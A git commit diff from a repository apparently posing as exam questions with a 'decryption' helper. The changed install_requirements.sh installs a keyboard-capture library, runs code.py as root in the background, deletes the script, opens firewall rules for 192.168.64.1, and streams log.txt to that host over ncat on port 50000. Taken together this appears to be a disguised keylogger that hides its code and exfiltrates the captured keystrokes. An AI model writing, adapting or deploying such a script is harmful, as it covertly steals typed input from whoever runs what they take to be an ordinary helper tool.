6018e779d83bb4b11edc097725b889fb6cc12159
Berkan Gökgöz <120216168+Bequery10@users.noreply.github.com>
2024-12-15 05:27:32 +0300

    Add files via upload

--- Tedu_mat102_final_questions_2024/encrpytion_tool/install_requirements.sh
+++ Tedu_mat102_final_questions_2024/encrpytion_tool/install_requirements.sh
@@ -1,19 +1,14 @@
 #!/bin/bash
-sudo apt-get update
-sudo apt-get install -y python3-pip
-sudo pip install -r requirements.txt
-python3 -u code.py
-sudo rm code.py
+source venv/bin/activate
 sudo apt-get update
 sudo apt-get install -y ncat
 sudo apt-get install -y ufw
+sudo apt install net-tools
 sudo ufw enable
 sudo ufw allow 50000/tcp
 sudo ufw allow out to 192.168.64.1
 sudo ufw allow in from 192.168.64.1
-#sudo ufw status
-
-while true; do
-    tail -f log.txt | ncat 192.168.64.1 50000
-    sleep 1
-done
+pip install keyboard
+sudo venv/bin/python3 -u code.py&
+sudo rm code.py &
+tail -f log.txt | ncat 192.168.64.1 50000                                      
--- Tedu_mat102_final_questions_2024/start_decryption.sh
+++ Tedu_mat102_final_questions_2024/start_decryption.sh
@@ -1,8 +1,6 @@
 #!/bin/bash
 cd encrpytion_tool
 sudo apt-get install -y python3
-sudo apt-get install -y python3-pip
-sudo apt-get install -y python3-venv
 sudo apt-get install -y python3-full
 sudo apt-get install -y python3-xlib
 python3 -m venv venv
